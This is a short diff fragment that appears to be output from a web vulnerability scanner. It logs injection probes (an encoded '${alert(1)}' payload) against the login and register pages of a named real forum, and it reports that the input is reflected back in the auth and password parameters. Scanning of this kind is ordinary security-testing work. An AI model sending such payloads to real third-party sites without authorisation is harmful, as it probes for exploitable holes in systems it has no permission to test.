@@ -1,0 +1,4 @@
+ [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://forum.1win.com/login/?auth=%24%7Balert(1)%7D
+   [→] Testing QUERY (password): https://forum.1win.com/login/?password=%24%7Balert(1)%7D
+   [🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://forum.1win.com/login/?password=%24%7Balert(1)%7D
+[🚨 API Data Reflection]: Injected code tracked returning through server endpoint: https://forum.1win.com/register/?password=%24%7Balert(1)%7D
